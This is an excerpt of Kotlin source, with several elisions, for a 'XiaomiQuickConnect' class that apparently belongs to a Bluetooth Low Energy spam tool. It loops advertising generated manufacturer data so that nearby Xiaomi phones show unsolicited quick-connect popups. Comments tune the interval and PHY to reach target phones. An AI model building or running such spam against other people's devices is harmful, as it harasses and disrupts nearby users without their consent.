...
class XiaomiQuickConnect : Spammer {
    ...
    companion object {
        private const val TAG = "XiaomiQuickConnect"
    ...
    override fun start() {
        executor.execute {
            ...
            // Legacy fast path (not extended): the old extended sets go out
            // on the secondary PHY, which most target phones scan slowly or
            // never. Interval clamped — a leftover 1000ms slider stalls the
            // popup the same way it did for Apple.
            try {
                while (loop <= Helper.MAX_LOOP && _isSpamming) {
                    val (hex, bytes) = Companion.generateManufacturerDataBytes(controlled = true)

                    try {
                        bluetoothAdvertiser.advertiseXiaomi(bytes)
                    } catch (e: Exception) {
                        Log.w(TAG, "advertise: $hex ${e.message}")
                    }
                ...
                bluetoothAdvertiser.stopXiaomi()
                _isSpamming = false
                executor.shutdown()
            }
        }
